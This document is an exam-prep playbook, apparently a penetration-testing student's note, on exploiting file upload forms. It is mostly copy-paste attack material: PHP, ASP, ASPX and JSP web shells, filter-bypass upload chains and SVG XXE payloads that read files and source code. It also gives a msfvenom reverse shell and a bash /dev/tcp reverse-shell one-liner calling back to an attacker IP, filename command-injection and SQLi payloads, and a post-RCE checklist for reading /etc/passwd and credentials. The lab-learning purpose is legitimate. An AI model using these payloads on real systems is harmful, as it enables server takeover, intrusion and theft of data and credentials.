# NOTE — File Upload Pentest Methodology (Exam Playbook)

## ID
600

## Module
File Upload Attacks

## Kind
methodology

## Title
File Upload Attacks — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for file upload attacks: recon → filter identification → bypass selection → payload delivery → RCE. Use as a decision tree under time pressure.

## Tags
methodology, file-upload, exam, cheatsheet, decision-tree, web-shell, xxe, svg, phar, burp

---

## TL;DR — The 5-Phase Flow

1. **Fingerprint** the back-end language (PHP / ASP / ASPX / JSP).
2. **Probe** the upload form to identify which filter layers exist (client-side / blacklist / whitelist / Content-Type / MIME-Type).
3. **Bypass** each active filter, chaining techniques as needed.
4. **Deliver** a payload — web shell first (always works if RCE works), reverse shell only if outbound is open.
5. **Trigger** at the upload directory URL, then post-exploitation (read flag, enumerate, pivot).

> **Golden rule:** Always upload one *legit* image first, intercept, and study the response. Don't guess filters — fuzz them.

---

## Phase 1 — Recon & Fingerprinting

### Identify back-end language
| Probe | Indicator |
|---|---|
| Visit `/index.php` / `/index.asp` / `/index.aspx` / `/index.jsp` | Whichever returns 200 OK = the language |
| Wappalyzer / BuiltWith | Tech stack at a glance |
| HTTP headers (`X-Powered-By`, `Server`) | `PHP/8.x`, `ASP.NET`, etc. |
| Burp Scanner passive | Auto-detects framework |

### Find the upload form
- Walk every page; look for `<input type="file">`, drag-drop zones, profile pictures, "Contact Us" forms, document submission.
- Inspect the `<input>` tag for `accept="..."` (hint of allowed types) and `onchange="checkFile(...)"` (client-side JS validation).
- Note any `<img src="...">` AFTER a successful upload — that path is your upload directory (or grep for `/uploads/`, `/profile_images/`, `/files/`, `/user_feedback_submissions/`, `/images/`).

### Discover the upload directory if not disclosed
- **Look at `<img src>` after upload** (most common).
- **Provoke errors** — upload duplicate filename, 5000-char filename, `CON.jpg` on Windows.
- **Concurrent uploads** of the same file → race condition error often leaks the path.
- **SVG XXE source-code read** of `upload.php` (see Phase 4).
- **Fuzz directories** — `ffuf`/`gobuster` with common upload paths.

---

## Phase 2 — Filter Identification

Upload a normal image, intercept in Burp, send to Repeater. Then probe each layer.

### The 5 filter layers (in order of strength)

| Layer | Where | How to detect | How to bypass |
|---|---|---|---|
| 1. Client-side JS | Browser | Error fires *before* HTTP request | Send via Burp/curl, or DOM-edit the `<input>` |
| 2. Extension blacklist | Server | `.php` → "Extension not allowed" | Fuzz alt PHP extensions (`.phar`, `.phtml`, `.pht`, `.pgif`, `.inc`) |
| 3. Extension whitelist | Server | `.phar` → "Only images are allowed" | Double-extension (`shell.jpg.php` or `shell.php.jpg`) |
| 4. Content-Type header | Server | Reject after switching `Content-Type` | Spoof in Burp to `image/jpeg`, `image/png`, `image/svg+xml` |
| 5. MIME-Type / magic bytes | Server | `mime_content_type()` rejects payload | Prepend `GIF8` to file content |

### Decision logic
- If `.php` uploads → no validation. Section 2 / 3 attack.
- If `.php` blocked but blacklist looks dumb → fuzz extensions (Section 5).
- If only image extensions accepted → reverse double-extension or chain with blacklist fuzz (Sections 6, 7).
- If file content checked → add `GIF8` magic bytes + fix Content-Type (Section 7).
- If everything blocked but SVG accepted → SVG XXE (Section 8) for source code, then craft targeted bypass (Skills Assessment).

---

## Phase 3 — Bypass Techniques

### 3.1 Client-side bypass (Section 4)
Two equivalent paths:

**A. Burp / curl (request modification — preferred):**
```
curl -s http://<TARGET>/upload.php \
  -F "uploadFile=@-;filename=shell.php;type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>'
```

**B. DOM manipulation:** `Ctrl+Shift+C` → click upload control → remove `accept=".jpg,.png"` and `onchange="checkFile(this)"` from `<input>` → submit normally.

### 3.2 Blacklist bypass (Section 5)
Fuzz alternative PHP extensions with Burp Intruder:
- Position: `filename="shell§.php§"` 
- Wordlist: [PayloadsAllTheThings extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- **Disable URL-encoding** (critical — otherwise `.` → `%2e`).
- Sort by length → "File successfully uploaded" responses = bypass found.

Common winners: `.phar`, `.phtml`, `.pht`, `.phtm`, `.pgif`, `.inc`. Case-bypass on Windows: `.pHp`.

```bash
# CLI fuzzing alternative
while read ext; do
  result=$(curl -s http://<TARGET>/upload.php \
    -F "uploadFile=@-;filename=shell${ext};type=image/png" <<< '<?php system($_REQUEST["cmd"]); ?>')
  echo "${ext} : ${result}"
done < php_extensions.lst
```

### 3.3 Whitelist bypass (Section 6)
Two strategies based on whitelist regex:

| Whitelist regex | Attack | Filename |
|---|---|---|
| `'/\.(jpg\|png\|gif)/'` (no `$` anchor) | **Forward double extension** | `shell.jpg.php` |
| `'/\.(jpg\|png\|gif)$/'` (`$` anchored, strict) | **Reverse double extension** (Apache `FilesMatch` misconfig) | `shell.php.jpg` |

The reverse-double-extension trick relies on Apache's `<FilesMatch ".+\.ph(ar|p|tml)">` directive matching `.php` *anywhere* in the name. Without that misconfig, the filename ends in `.jpg` and is served as static.

### 3.4 Content-Type bypass (Section 7)
Set the `Content-Type` header in the multipart body to an allowed image type:
- `image/jpeg`, `image/jpg`, `image/png`, `image/gif`, `image/svg+xml`

There are TWO Content-Type headers in upload requests (request-level and per-file). Modify the **per-file** one first.

### 3.5 MIME-Type / magic bytes bypass (Section 7)
`mime_content_type()` reads the first bytes of the file. Prepend `GIF8` to fool it:

```bash
echo "GIF8" > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
file shell.php   # confirms: GIF image data
```

`GIF8` is preferred because it's printable ASCII; other magic bytes (PNG `\x89PNG`, JPEG `\xFF\xD8`) have non-printable bytes.

### 3.6 Full-chain bypass (Sections 7 & Skills Assessment)
When *all* filters are active, chain them:

```
Filename:      shell.jpg.phar      (or .phar.svg, depending on whitelist)
Content-Type:  image/jpeg          (header — spoofed)
Content:       GIF8\n<?php system($_REQUEST['cmd']); ?>
```

Or for SVG-allowed targets:
```
Filename:      shell.phar.svg       (renamed locally to .jpeg, switch back in Burp)
Content-Type:  image/svg+xml
Content:       <?xml version="1.0"?><!DOCTYPE svg [...]><svg>...</svg> <?php system($_REQUEST['cmd']); ?>
```

---

## Phase 4 — Limited Uploads (When RCE-via-extension fails)

### SVG XXE — read arbitrary files (Section 8)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```
Upload as `.svg` with `Content-Type: image/svg+xml`. View page source after upload — flag is inside the `<svg>` tag.

### SVG XXE — read PHP source (whitebox recon)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
Decode response: `echo "<BASE64>" | base64 -d`. Look for `$target_dir`, naming scheme (e.g., `date('ymd')_filename`), and exact regex patterns.

### XSS via SVG / metadata
- SVG with `<script>alert(1)</script>` if rendered inline.
- Image metadata: `exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' image.jpg`.
- Change MIME to `text/html` to force browser HTML rendering.

### DoS vectors
- Decompression bombs (nested ZIPs).
- Pixel flood (declare 100000×100000 in image header).
- Oversized files.

### Filename-as-injection (Section 9)
| Payload filename | Vector |
|---|---|
| `file$(whoami).jpg` | OS command substitution |
| `file\`id\`.png` | Backtick command exec |
| `file.jpg\|\|ping -c 10 127.0.0.1` | Pipe / OR command |
| `<svg onload=alert(1)>.svg` | XSS reflected from filename |
| `file';select+sleep(5);--.jpg` | SQLi (if filename hits DB) |
| `CON.jpg`, `NUL.png`, `LPT1.txt` | Windows reserved names — leaks path via error |
| `WEB~1.CON` | Windows 8.3 short name — overwrite `web.conf` |

---

## Phase 5 — Payloads (Copy-Paste Ready)

### Minimal RCE confirmation
```php
<?php system('id'); ?>
```

### Parameterised web shell (always preferred)
```php
<?php system($_REQUEST['cmd']); ?>
```
Trigger: `curl 'http://<TARGET>/uploads/shell.php?cmd=id'`

### Web shell with magic-byte prefix (for MIME bypass)
```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

### SVG + PHP combo (for `.svg`-only whitelists)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
```

### Reverse shell — msfvenom PHP
```bash
msfvenom -p php/reverse_php LHOST=<TUN0_IP> LPORT=4444 -f raw > revshell.php
nc -lvnp 4444 -s <TUN0_IP>     # bind to tun0 only — avoid internet noise
curl -s http://<TARGET>/uploads/revshell.php
```

### Bash one-liner via existing web shell
```bash
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'" \
  "http://<TARGET>/uploads/RCE.php"
```

### ASP / ASPX / JSP equivalents
| Lang | Web shell payload |
|---|---|
| ASP | `<%eval request("cmd")%>` |
| ASPX | `<%@ Page Language="C#"%><% Response.Write(new System.Diagnostics.Process(){StartInfo={FileName="cmd",Arguments="/c "+Request["cmd"],RedirectStandardOutput=true,UseShellExecute=false}}.Start()); %>` |
| JSP | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |

Drop-in shells: `/opt/useful/seclists/Web-Shells/`, `phpbash`, [PayloadsAllTheThings/Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

---

## Phase 6 — Trigger & Post-Exploitation

### Trigger the shell
```bash
# Verify shell is live
curl -s 'http://<TARGET>/<UPLOAD_DIR>/shell.phar?cmd=id'
# Expected: uid=33(www-data) ...

# Read flag
curl -s 'http://<TARGET>/<UPLOAD_DIR>/shell.phar?cmd=cat+/flag.txt'

# If filename is date-prefixed (skills assessment style)
YMD=$(date +%y%m%d)
curl -s "http://<TARGET>/contact/user_feedback_submissions/${YMD}_shell.phar.svg?cmd=ls+/"
```

### Post-RCE checklist
1. `id` → know your context (usually `www-data`).
2. `ls /` → look for `flag.txt`, `flag_*.txt`, `root.txt`, etc.
3. `cat /etc/passwd` → users for credential reuse.
4. `hostname && uname -a` → environment context.
5. SUID / sudo / capabilities → privilege escalation handoff.
6. Check `/var/www`, `/etc/apache2`, `/opt` for app secrets and DB creds.

---

## Decision Tree (Under Exam Pressure)

```
Upload form spotted
│
├── Try uploading shell.php directly
│   ├── Success → DONE — read flag (Section 2)
│   └── Blocked → continue
│
├── Is rejection client-side only? (no HTTP request fires)
│   └── Yes → DOM edit OR Burp/curl bypass → upload .php (Section 4)
│
├── Server-side rejection of .php
│   ├── Fuzz extensions (Burp Intruder, disable URL-encode)
│   │   ├── ".phar" / ".phtml" / ".pht" succeeds → upload as that (Section 5)
│   │   └── All non-image rejected → whitelist active, continue
│   │
│   ├── Try double extension
│   │   ├── shell.jpg.php works → weak whitelist regex (Section 6)
│   │   ├── shell.php.jpg works → Apache FilesMatch misconfig (Section 6)
│   │   └── Still blocked → Content-Type / MIME also active
│   │
│   ├── Add GIF8 magic bytes + spoof Content-Type → retry double-ext (Section 7)
│   │   ├── Works → DONE
│   │   └── Still blocked → SVG-only whitelist? continue
│   │
│   └── If SVG accepted → SVG XXE for source code (Section 8)
│       └── Read upload.php → derive exact bypass → craft .phar.svg (Skills Assessment)
│
└── Nothing executes? Try filename injection / Windows quirks (Section 9)
```

---

## Quick Reference — The Tools

| Task | Tool / Command |
|---|---|
| Intercept request | Burp Suite + FoxyProxy "Burp (8080)" |
| Fuzz extensions / Content-Types | Burp Intruder (Sniper) — disable URL-encode |
| Send raw upload | `curl -F "uploadFile=@file;filename=X;type=Y" <url>` |
| Check magic bytes | `file <file>` |
| Decode XXE output | `echo '<BASE64>' \| base64 -d` |
| Listener (bind to VPN) | `nc -lvnp <PORT> -s <TUN0_IP>` |
| VPN IP | `ip a show tun0 \| grep inet` |
| Generate revshell | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<P> -f raw > rev.php` |
| Wordlists | PayloadsAllTheThings extensions.lst, SecLists web-all-content-types.txt |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: No validation ===
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
# Upload normally → curl 'http://T/uploads/shell.php?cmd=id'

# === Scenario 2: Client-side only ===
curl -s http://T/upload.php -F "uploadFile=@-;filename=shell.php;type=image/png" \
  <<< '<?php system($_REQUEST["cmd"]); ?>'

# === Scenario 3: Blacklist (fuzz) ===
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
# Burp Intruder → Position on extension → disable URL-encode → run

# === Scenario 4: Whitelist (double-ext) ===
echo '<?php system("cat /flag.txt"); ?>' > readFlag.php.jpg
# Upload → access /uploads/readFlag.phar.jpg (after fuzz finds .phar bypasses BL)

# === Scenario 5: All 5 filters ===
echo "GIF8"                                        > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>'         >> shell.php
# Upload as cat.jpg.phar with Content-Type: image/jpeg

# === Scenario 6: SVG-only (Skills Assessment) ===
cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
EOF
mv shell.phar.svg shell.phar.jpeg     # frontend bypass
# In Burp: change filename back to .svg, Content-Type: image/svg+xml

# === Scenario 7: Locked-down — XXE source read ===
cat << 'EOF' > xxe.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF
# Upload → view page source → base64-decode → read regex → craft targeted bypass
```

---

## Top Gotchas (Things That Will Burn You)

1. **Forgot to disable URL-encode in Intruder** — every payload becomes `%2e` and silently fails. ALWAYS disable.
2. **Verify the LIVE shell first** with `?cmd=id` — uploading 2 files with the same name often means stale content is served.
3. **`hostname` instead of `id` output** = wrong file is live, not a payload bug. Re-upload with a different name.
4. **`nc` on public Pwnbox without `-s tun0`** catches internet scanner noise on common ports (443, 80, 22, 8080). Binary garbage on 443 = TLS scanner, not your shell.
5. **Reverse shell timeouts across all ports** = aggressive egress firewall. Don't waste time — finish with the web shell.
6. **`bash` not `sh`** required for `/dev/tcp/` redirection — verify with `?cmd=which+bash`.
7. **Two Content-Type headers** in upload requests — modify the per-file one (inside multipart body), not just the request-level one.
8. **`GIF8` will appear in command output** — it's literal text printed before the PHP runs. Not an error.
9. **`.phps` returns source** instead of executing — useful for recon, useless for RCE.
10. **Date-prefixed filenames** (skills assessment) — recompute YMD daily: `date +%y%m%d`.
11. **Frontend rejects `.svg` but backend accepts it** — rename locally to `.jpeg`, switch back in Burp.
12. **Random renaming server-side** neutralises filename injection — but check if the original is reflected elsewhere (logs, page response).
13. **`latest.xml` / cached SVG** — server may render the previous SVG, not your new one. Respawn target if XXE returns yesterday's payload.
14. **Burp not catching the request** = FoxyProxy not on Burp profile. Set BEFORE clicking Upload.
15. **Apache `FilesMatch` misconfig** is the only reason reverse double extensions work — not universal.

---

## Reference Wordlists

| Use case | Wordlist |
|---|---|
| Extension fuzzing | `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst` |
| Content-Type fuzzing | `https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt` |
| Drop-in shells | `/opt/useful/seclists/Web-Shells/` |
| All upload payloads | `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files` |

---

## Related Vault Notes

- `01 - File Uploads.md` — concept overview
- `02-absent-validation.md` — no-filter RCE
- `03-upload-exploitation.md` — web shell vs reverse shell, firewall caveats
- `04-file_upload_attacks_client_side_validation.md` — JS bypass
- `05-file_upload_attacks_blacklist_filters.md` — extension fuzzing
- `06-whitelist-filters.md` — double / reverse double extension
- `07-type-filters.md` — Content-Type + MIME / GIF8 magic bytes
- `08-limited-file-uploads.md` — SVG XXE, XSS, DoS
- `09-other-upload-attacks.md` — filename injection, Windows quirks
- `11-skills-assessment-file-upload-attacks.md` — full chain demo
